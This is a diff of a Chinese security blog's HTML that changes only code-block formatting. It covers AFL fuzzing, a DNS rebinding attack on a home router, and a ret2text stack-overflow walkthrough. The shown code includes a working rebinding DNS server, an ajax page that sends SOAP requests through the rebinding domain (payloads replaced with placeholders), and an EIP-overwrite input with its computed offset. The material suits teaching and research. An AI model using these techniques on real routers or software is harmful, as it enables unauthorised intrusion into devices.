 <li><p>从文件读取输入的目标程序，@@就是占位符，表示输入替换的位置 </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</code></pre>
 </li>
 </ol>
 <p>常见命令的含义:</p>
@@ -201,15 +470,13 @@
 <li>-S：运行从属(Slave) <code>Fuzzer</code></li>
 </ul>
 <p>运行<code>afl-fuzz</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i afl_in/ -o afl_out/ ./afl_test -f</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">afl-fuzz -i afl_in/ -o afl_out/ ./afl_test -f</code></pre>
 <p>此处如果第一次运行会报一个错误</p>
 <p><img src="http://file.smilehacker.net/1571209319832.png" alt="1571209319832"></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Pipe at the beginning of 'core_pattern'</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">Pipe at the beginning of &#39;core_pattern&#39;</code></pre>
 <p>解决方法如下:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo core &gt;/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">sudo su
+echo core &gt;/proc/sys/kernel/core_pattern</code></pre>
 <h3 id="Fuzz运行界面"><a href="#Fuzz运行界面" class="headerlink" title="Fuzz运行界面"></a>Fuzz运行界面</h3><p><img src="http://file.smilehacker.net/1570957117241.png" alt="1570957117241"></p>
 <p>下面选择界面上几个重要的部分来介绍一下</p>
 <ul>
@@ -281,39 +548,51 @@
 <p>在文末补充具体的异常调试</p>
 <h2 id="有源码AFL测试-LLVM模式"><a href="#有源码AFL测试-LLVM模式" class="headerlink" title="有源码AFL测试-LLVM模式"></a>有源码AFL测试-LLVM模式</h2><p><code>LLVM Mode</code>模式编译程序可以获得更快的Fuzzing速度，因此针对大型项目可以考虑启用</p>
 <h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>安装系统依赖包:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install llvm clang</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">sudo apt install llvm clang</code></pre>
 <p>进入<code>AFL</code>源码目录编译<code>afl llvm</code>模块</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd llvm_mode/</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">cd llvm_mode/
 
+make</code></pre>
 <p>编译完成后,在<code>AFL</code>跟目录下应该出现了<code>afl-clang-fast</code>,后面编译代码时使用<code>afl-clang-fast</code>构建程序即可。需要添加一下软连接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ln -s /home/tt/afl-2.52b/afl-clang-fast[源路径] /usr/local/bin/afl-clang-fast[目标路径]</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shel">sudo ln -s /home/tt/afl-2.52b/afl-clang-fast[源路径] /usr/local/bin/afl-clang-fast[目标路径]</code></pre>
 <h3 id="llvm-model编译代码"><a href="#llvm-model编译代码" class="headerlink" title="llvm model编译代码"></a><code>llvm model</code>编译代码</h3><p>使用<code>afl-clang-fast</code>编译最初存在漏洞的代码</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-clang-fast -g afl_test.c -o afl_test</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">afl-clang-fast -g afl_test.c -o afl_test</code></pre>
 <p><img src="http://file.smilehacker.net/1571023550045.png" alt="1571023550045"></p>
-<h3 id="开始Fuzz-1"><a href="#开始Fuzz-1" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i afl_in -o afl_out ./afl_test -f</span><br></pre></td></tr></table></figure>
-
+<h3 id="开始Fuzz-1"><a href="#开始Fuzz-1" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h3><pre><code class="shell">afl-fuzz -i afl_in -o afl_out ./afl_test -f</code></pre>
 <p><img src="http://file.smilehacker.net/1571023823108.png" alt="1571023823108"></p>
 <h2 id="无源码的AFL测试-Qemu模式"><a href="#无源码的AFL测试-Qemu模式" class="headerlink" title="无源码的AFL测试-Qemu模式"></a>无源码的AFL测试-Qemu模式</h2><h3 id="安装Qemu"><a href="#安装Qemu" class="headerlink" title="安装Qemu"></a>安装<code>Qemu</code></h3><p>还有一些情况我们根本拿不到程序的代码，没有办法对源码进行插桩，不过<code>AFL</code>提供了<code>qemu</code>模式进行测试</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd afl-2.52b/qemu-mode</span><br><span class="line"></span><br><span class="line">./build_qemu_support.sh </span><br><span class="line">cd ..</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">cd afl-2.52b/qemu-mode
 
+./build_qemu_support.sh 
+cd ..
+make install </code></pre>
 <p>有可能在执行<code>./build_qemu_support.sh</code>时出现如下错误</p>
 <p><img src="http://file.smilehacker.net/1570980361643.png" alt="1570980361643"></p>
 <p>执行如下代码即可:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://mirrors.kernel.org/gnu/libtool/libtool-2.2.6b.tar.gz \</span><br><span class="line">&amp;&amp; tar xzvf libtool-2.2.6b.tar.gz \</span><br><span class="line">&amp;&amp; cd libtool-2.2.6b \</span><br><span class="line">&amp;&amp; ./configure –prefix=/usr/local</span><br><span class="line"></span><br><span class="line">make &amp;&amp; sudo make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##############或者#############</span></span></span><br><span class="line">sudo apt-get install libtool-bin</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">wget http://mirrors.kernel.org/gnu/libtool/libtool-2.2.6b.tar.gz \
+&amp;&amp; tar xzvf libtool-2.2.6b.tar.gz \
+&amp;&amp; cd libtool-2.2.6b \
+&amp;&amp; ./configure –prefix=/usr/local
 
+make &amp;&amp; sudo make install
+
+###############或者#############
+sudo apt-get install libtool-bin</code></pre>
 <p>编译成功:</p>
 <p><img src="http://file.smilehacker.net/1570981177555.png" alt="1570981177555"></p>
 <p>回到代码目录,使用<code>gcc</code>重新编译测试代码，并重新执行<code>afl-fuzz</code>命令(这次加上<code>-Q</code>)</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc afl_test.c -o afl_test</span><br><span class="line"></span><br><span class="line">afl-fuzz -i afl_in/ -o afl_out/ -Q ./afl_test -f</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">gcc afl_test.c -o afl_test
 
+afl-fuzz -i afl_in/ -o afl_out/ -Q ./afl_test -f</code></pre>
 <p>有可能碰到如下错误:</p>
 <p><img src="http://file.smilehacker.net/1570982707245.png" alt="1570982707245"></p>
 <p>解决方法:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在文件结尾添加如下内容</span></span><br><span class="line">export AFL_PATH=/home/tt/afl-2.52b #你的afl-qemu-trace所在路径，如果根据文章走下来,那就是你的afl源码目录</span><br><span class="line"></span><br><span class="line">source ~/.bashrc # 重新加载</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">vim ~/.bashrc
 
+# 在文件结尾添加如下内容
+export AFL_PATH=/home/tt/afl-2.52b #你的afl-qemu-trace所在路径，如果根据文章走下来,那就是你的afl源码目录
+
+source ~/.bashrc # 重新加载</code></pre>
 <p><img src="http://file.smilehacker.net/1570982887916.png" alt="1570982887916"></p>
 <p>重新运行,已经成功运行了,但是对比一下两个模式，会发现在<code>Qemu</code>模式下的速度比源码编译插桩的速度慢了很多。</p>
 <h2 id="AFL-Fuzz结果分析"><a href="#AFL-Fuzz结果分析" class="headerlink" title="AFL Fuzz结果分析"></a>AFL Fuzz结果分析</h2><h3 id="工作状态"><a href="#工作状态" class="headerlink" title="工作状态"></a>工作状态</h3><p> <code>afl-fuzz</code>永远不会停止，所以何时停止测试很多时候就是依靠<code>afl-fuzz</code>提供的状态来决定的。具体的几种方式如下所示: </p>
@@ -341,12 +620,10 @@
 <li>plot_data：用于afl-plot绘图。</li>
 </ul>
 <h3 id="对Crash的结果进行简单分析"><a href="#对Crash的结果进行简单分析" class="headerlink" title="对Crash的结果进行简单分析"></a>对Crash的结果进行简单分析</h3><h4 id="crash-exploration-mode"><a href="#crash-exploration-mode" class="headerlink" title="crash exploration mode"></a>crash exploration mode</h4><p> afl-fuzz的一种运行模式，也称为<code>peruvian rabbit mode</code>，用于确定bug的可利用性，其输入的是crash的信息，之后使用<code>-C</code>启用这种模式，afl会自动探索并创造与之相关的crash来帮助你进行分析，比如判断能够控制某块内存地址的长度。 </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -m none -C -i ./afl_out/crashes -o ./peruvian-were-rabbit_out -- ./afl_test -f</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">afl-fuzz -m none -C -i ./afl_out/crashes -o ./peruvian-were-rabbit_out -- ./afl_test -f</code></pre>
 <h4 id="triage-crashes-sh"><a href="#triage-crashes-sh" class="headerlink" title="triage_crashes.sh"></a>triage_crashes.sh</h4><p> AFL源码的experimental目录中有一个名为triage_crashes.sh的脚本，可以帮助我们触发收集到的crashes。 </p>
 <p>直接使用脚本跟参数的话，我们可以看到相关crash情况的寄存器等信息，但是如果只是大致分类的话，可以使用如下命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh /home/tt/afl-2.52b/experimental/crash_triage/triage_crashes.sh ./afl_out ./afl_test  2&gt;&amp;1 | grep SIGNAL</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">sh /home/tt/afl-2.52b/experimental/crash_triage/triage_crashes.sh ./afl_out ./afl_test  2&gt;&amp;1 | grep SIGNAL</code></pre>
 <p><img src="http://file.smilehacker.net/1571025845455.png" alt="1571025845455"></p>
 <p>根据输出的11可以做一个大概的判断，但是具体还是需要手动调试</p>
 <h4 id="推荐两个分析结果的工具"><a href="#推荐两个分析结果的工具" class="headerlink" title="推荐两个分析结果的工具"></a>推荐两个分析结果的工具</h4><ul>
@@ -358,8 +635,11 @@
 <h3 id="缓冲区溢出分析"><a href="#缓冲区溢出分析" class="headerlink" title="缓冲区溢出分析"></a>缓冲区溢出分析</h3><p>使用<code>GDB</code>对缓冲区进行实际分析，在分析前先来看下猜测为导致缓冲区溢的<code>case</code>:</p>
 <p><img src="http://file.smilehacker.net/1571209606024.png" alt="1571209606024"></p>
 <p>接下来使用<code>GDB</code>加载程序</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb afl_test</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">直接让程序运行，并且在运行时导入AFL输出导致程序crash的<span class="keyword">case</span></span></span><br><span class="line"></span><br><span class="line">run &lt; stackoverflow</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">gdb afl_test
 
+#直接让程序运行，并且在运行时导入AFL输出导致程序crash的case
+
+run &lt; stackoverflow</code></pre>
 <p>这里对文件进行了重命名，不然在<code>gdb</code>中导入会有一点问题。</p>
 <p><img src="http://file.smilehacker.net/1571209574876.png" alt="1571209574876"></p>
 <p>程序运行后,找到产生<code>crash</code>位置,</p>
@@ -439,8 +719,43 @@
 <blockquote>
 <p>pip install twisted -i <a href="https://pypi.douban.com/simple" target="_blank" rel="noopener">https://pypi.douban.com/simple</a></p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line">record=&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip = <span class="string">"43.228.76.56"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip = <span class="string">"192.168.0.1"</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name] = <span class="number">0</span></span><br><span class="line">        record[name] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> name + <span class="string">" ===&gt; "</span> + ip</span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name = name,</span><br><span class="line">            type = dns.A,</span><br><span class="line">            cls = dns.IN,</span><br><span class="line">            ttl = <span class="number">0</span>,</span><br><span class="line">            payload = dns.Record_A(address = <span class="string">b'%s'</span> % ip, ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">from twisted.internet import reactor, defer
+from twisted.names import client, dns, error, server
+record={}
+class DynamicResolver(object):
+    def _doDynamicResponse(self, query):
+        name = query.name.name
+        if name not in record or record[name]&lt;1:
+            ip = &quot;43.228.76.56&quot;
+        else:
+            ip = &quot;192.168.0.1&quot;
+        if name not in record:
+            record[name] = 0
+        record[name] += 1
+        print name + &quot; ===&gt; &quot; + ip
+        answer = dns.RRHeader(
+            name = name,
+            type = dns.A,
+            cls = dns.IN,
+            ttl = 0,
+            payload = dns.Record_A(address = b&#39;%s&#39; % ip, ttl=0)
+        )
+        answers = [answer]
+        authority = []
+        additional = []
+        return answers, authority, additional
+    def query(self, query, timeout=None):
+        return defer.succeed(self._doDynamicResponse(query))
+def main():
+    factory = server.DNSServerFactory(
+        clients=[DynamicResolver(), client.Resolver(resolv=&#39;/etc/resolv.conf&#39;)]
+    )
+    protocol = dns.DNSDatagramProtocol(controller=factory)
+    reactor.listenUDP(53, protocol)
+    reactor.run()
+if __name__ == &#39;__main__&#39;:
+    raise SystemExit(main())
+</code></pre>
 <p>代码功能:</p>
 <ul>
 <li>第一次DNS请求返回的IP为43.228.76.56，其余时候返回的都是路由器的IP(192.168.0.1)。</li>
@@ -448,11 +763,84 @@
 <p>剩下只需要把漏洞利用代码放到HTML中就可以了</p>
 <p><strong>具体漏洞利用代码已经删除,有兴趣的可自行Google</strong></p>
 <p>index.html:</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"ajax.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="HTML">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
+    &lt;title&gt;&lt;/title&gt;
 
+&lt;/head&gt;
+&lt;body&gt;
+&lt;iframe src=&quot;ajax.html&quot;&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
 <p>ajax.html</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> xmg_01 = <span class="string">"payload1"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> xmg_02 = <span class="string">"payload2"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> settings = &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="string">"async"</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"crossDomain"</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"url"</span>: <span class="string">"http://dns_rebind.smilehacker.net/"</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"method"</span>: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"headers"</span>: &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="string">"Content-Type"</span>: <span class="string">"application/xml"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"SOAPAction"</span>: <span class="string">"vuln_address"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"cache-control"</span>: <span class="string">"no-cache"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"Postman-Token"</span>: <span class="string">"68b84160-c326-4b1a-a001-83b408d6435f"</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="actionscript">            <span class="string">"data"</span>: <span class="string">"payload1"</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        $.ajax(settings).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(response);</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> setting = &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="string">"async"</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"crossDomain"</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"url"</span>: <span class="string">"http://dns_rebind.smilehacker.net/"</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"method"</span>: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"headers"</span>: &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="string">"SOAPAction"</span>: <span class="string">"vuln_address"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"cache-control"</span>: <span class="string">"no-cache"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"Postman-Token"</span>: <span class="string">"a1a1e78d-faa1-49c6-aef9-0c54b9f3c73b"</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="actionscript">            <span class="string">"data"</span>: <span class="string">"payload2"</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        $.ajax(setting).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span></span><br><span class="line">            test();</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(response);</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">"test"</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"点"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"foo()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="HTML">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;Title&lt;/title&gt;
+    &lt;script src=&quot;./jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script&gt;
 
+    var xmg_01 = &quot;payload1&quot;;
+
+    var xmg_02 = &quot;payload2&quot;;
+
+    function foo(){
+        var settings = {
+            &quot;async&quot;: true,
+            &quot;crossDomain&quot;: true,
+            &quot;url&quot;: &quot;http://dns_rebind.smilehacker.net/&quot;,
+            &quot;method&quot;: &quot;POST&quot;,
+            &quot;headers&quot;: {
+                &quot;Content-Type&quot;: &quot;application/xml&quot;,
+                &quot;SOAPAction&quot;: &quot;vuln_address&quot;,
+                &quot;cache-control&quot;: &quot;no-cache&quot;,
+                &quot;Postman-Token&quot;: &quot;68b84160-c326-4b1a-a001-83b408d6435f&quot;
+            },
+            &quot;data&quot;: &quot;payload1&quot;
+        };
+
+        $.ajax(settings).done(function (response) {
+            document.write(response);
+        });
+
+        var setting = {
+            &quot;async&quot;: true,
+            &quot;crossDomain&quot;: true,
+            &quot;url&quot;: &quot;http://dns_rebind.smilehacker.net/&quot;,
+            &quot;method&quot;: &quot;POST&quot;,
+            &quot;headers&quot;: {
+                &quot;SOAPAction&quot;: &quot;vuln_address&quot;,
+                &quot;cache-control&quot;: &quot;no-cache&quot;,
+                &quot;Postman-Token&quot;: &quot;a1a1e78d-faa1-49c6-aef9-0c54b9f3c73b&quot;
+            },
+            &quot;data&quot;: &quot;payload2&quot;
+        };
+
+        $.ajax(setting).done(function (response) {
+            test();
+            document.write(response);
+        });
+
+
+    }
+
+    function test(){
+        document.write(&quot;test&quot;);
+    }
+
+&lt;/script&gt;
+
+&lt;input value=&quot;点&quot; type=&quot;button&quot; onclick=&quot;foo()&quot;&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
 <h4 id="攻击展示图"><a href="#攻击展示图" class="headerlink" title="攻击展示图:"></a>攻击展示图:</h4><ul>
 <li>攻击场景1:<br>此处修改了Firefox的DNS缓存时间为0,比且修改了DNS Server中域名返回外网IP的次数</li>
 </ul>
@@ -500,24 +888,49 @@
 <h3 id="手动计算返回地址的偏移"><a href="#手动计算返回地址的偏移" class="headerlink" title="手动计算返回地址的偏移"></a>手动计算返回地址的偏移</h3><p>工具用起来比较简单，就不介绍了，直接通过手动分析。</p>
 <p>工具 :  <a href="https://github.com/desword/shellcode_tools" target="_blank" rel="noopener">patternoffset</a> </p>
 <p>先使用<code>GDB</code>加载程序,在<code>call _gets</code>前下断，然后运行程序，关于<code>GDB</code>的使用参考：<a href="https://blog.pwntools.xyz/2019/10/20/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#more">GDB</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> disassemble main <span class="comment">#查看main函数的汇编代码</span></span></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   .... #不删掉篇幅太长</span><br><span class="line">   0x080486ae &lt;+102&gt;:	call   0x8048460 &lt;gets@plt&gt;</span><br><span class="line">   ....</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b *main+102 <span class="comment">#在main函数偏移102行处下断点</span></span></span><br><span class="line"></span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r <span class="comment">#运行程序</span></span></span><br></pre></td></tr></table></figure>
+<pre><code class="shell">pwndbg&gt; disassemble main #查看main函数的汇编代码
+Dump of assembler code for function main:
+   .... #不删掉篇幅太长
+   0x080486ae &lt;+102&gt;:    call   0x8048460 &lt;gets@plt&gt;
+   ....
+End of assembler dump.
 
+pwndbg&gt; b *main+102 #在main函数偏移102行处下断点
+
+Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
+
+pwndbg&gt; r #运行程序
+</code></pre>
 <p>运行结果如下:</p>
 <p><img src="http://file.smilehacker.net/1571475799729.png" alt="GDB运行后栈帧的情况"></p>
 <p>结合<code>IDA</code>的反编译结果计算<code>ESP</code>到<code>&amp;s</code>的偏移:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ESP = 0xffffcfa0</span><br><span class="line">EBP = 0Xffffd028</span><br><span class="line">&amp;S = ESP + 1CH = 0xffffcfbc</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &amp;s -&gt; <span class="variable">$EBP</span>的距离 offset </span></span><br><span class="line">offset = $EBP - $S = 6C[hex] = 108[DEC]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> func <span class="built_in">return</span> address</span></span><br><span class="line">return address = 108 + 4 = 112</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">ESP = 0xffffcfa0
+EBP = 0Xffffd028
+&amp;S = ESP + 1CH = 0xffffcfbc
 
+# &amp;s -&gt; $EBP的距离 offset 
+offset = $EBP - $S = 6C[hex] = 108[DEC]
+
+# func return address
+return address = 108 + 4 = 112</code></pre>
 <h3 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果:"></a>验证结果:</h3><p>用<code>python</code>生成一段字符，然后输入程序，看出错时结果是不是为我们指定的结果</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在shell下执行</span></span><br><span class="line">python -c "print 'A'*112 + 'BBBB' " &gt; test</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在GDB中执行</span></span><br><span class="line">run &lt; test</span><br></pre></td></tr></table></figure>
+<pre><code class="shell"># 在shell下执行
+python -c &quot;print &#39;A&#39;*112 + &#39;BBBB&#39; &quot; &gt; test
 
+# 在GDB中执行
+run &lt; test</code></pre>
 <p>结果如下,可以看到<code>EIP</code>已经被劫持为<code>0X424242(BBBB)</code>:</p>
 <p><img src="http://file.smilehacker.net/1571476789765.png" alt="EIP已被劫持"></p>
 <h3 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>接下来尝试在程序中寻找调用系统命令地地方,在<code>IDA</code>中按<code>ALT+T</code>搜索<code>/bin/sh</code>，正好看到有,并且调用了<code>system</code>函数</p>
 <p><img src="http://file.smilehacker.net/1571476973841.png" alt="IDA搜索结果"></p>
